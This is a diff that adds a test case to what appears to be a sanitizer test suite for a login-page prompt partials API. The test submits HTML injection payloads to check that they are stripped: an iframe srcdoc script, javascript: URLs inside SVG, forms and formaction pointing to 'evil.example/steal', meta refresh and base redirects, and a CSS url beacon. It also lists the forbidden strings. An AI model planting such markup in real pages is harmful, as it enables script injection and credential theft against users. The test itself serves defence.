@@ -414,6 +414,61 @@ describe("prompts", () => {
     expect(stored).toEqual(body);
   });
 
+  it("should strip embedded content, navigation, SVG and form overrides", async () => {
+    const { managementApp, env } = await getTestServer();
+    const managementClient = testClient(managementApp, env);
+    const token = await getAdminToken();
+
+    const response = await managementClient.prompts[":prompt"].partials.$put(
+      {
+        header: { "tenant-id": "tenantId" },
+        param: { prompt: "login" },
+        json: {
+          login: {
+            "form-content-end": [
+              '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
+              '<object data="https://evil.example/x"></object>',
+              '<embed src="https://evil.example/x">',
+              '<base href="https://evil.example/">',
+              '<meta http-equiv="refresh" content="0;url=https://evil.example">',
+              '<form action="https://evil.example/steal"><input name="x"></form>',
+              '<button formaction="https://evil.example/steal">Go</button>',
+              '<svg><a xlink:href="javascript:alert(2)"><animate attributeName="href" to="javascript:alert(3)"/></a></svg>',
+              "<style>input{background:url(https://evil.example)}</style>",
+              '<a href="//evil.example">Proto</a>',
+              '<img src="data:image/svg+xml,x" alt="x">',
+            ].join(""),
+          },
+        },
+      },
+      { headers: { authorization: `Bearer ${token}` } },
+    );
+
+    expect(response.status).toBe(200);
+    const body = await response.json();
+    const html = body.login?.["form-content-end"] ?? "";
+    for (const forbidden of [
+      "<iframe",
+      "srcdoc",
+      "<object",
+      "<embed",
+      "<base",
+      "<meta",
+      "<form",
+      "formaction",
+      "<svg",
+      "<animate",
+      "javascript:",
+      "<style",
+      "evil.example",
+      "data:",
+    ]) {
+      expect(html).not.toContain(forbidden);
+    }
+    expect(html).toContain('<input name="x"');
+    expect(html).toContain("<button>Go</button>");
+  });
+
   it("should require the matching prompt scope for each partials operation", async () => {
     const { managementApp, env } = await getTestServer();
     const managementClient = testClient(managementApp, env);
